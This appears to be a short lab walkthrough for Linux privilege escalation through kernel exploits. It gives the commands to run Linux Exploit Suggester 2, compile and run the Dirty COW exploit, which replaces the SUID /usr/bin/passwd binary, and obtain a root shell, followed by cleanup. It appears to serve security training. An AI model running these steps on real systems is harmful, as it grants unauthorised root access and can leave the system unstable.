# Kernel Exploits

Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.

Run the **Linux Exploit Suggester 2** tool to identify potential kernel exploits on the current system:

`perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl`

The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at **/home/user/tools/kernel-exploits/dirtycow/c0w.c**. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).

Compile the code and run it (note that it may take several minutes to complete):

`gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w`\
`./c0w`

Once the exploit completes, run /usr/bin/passwd to gain a root shell:

`/usr/bin/passwd`

Remember to restore the original **/usr/bin/passwd** file and exit the root shell before continuing!

`mv /tmp/bak /usr/bin/passwd`\
`exit`
